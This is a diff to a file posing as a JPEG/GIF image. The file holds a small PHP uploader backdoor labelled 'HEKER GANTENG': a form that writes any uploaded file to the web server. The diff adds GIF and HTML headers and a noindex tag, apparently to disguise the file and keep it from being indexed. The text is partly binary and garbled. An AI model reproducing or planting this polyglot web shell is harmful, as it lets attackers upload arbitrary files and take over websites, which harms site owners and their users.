@@ -1,4 +1,12 @@
+
 ����JFIF��
+GIF89a=<!DOCTYPE html>
+<html>
+
+<meta name="robots" content="noindex, nofollow" />.
+
+<body >
+<center>
 <?php echo"<b>HEKER GANTENG</b><br>";if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Berhasil";}else{echo"Gak Berhasil";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=Go!>";}?>��C	
 
 			
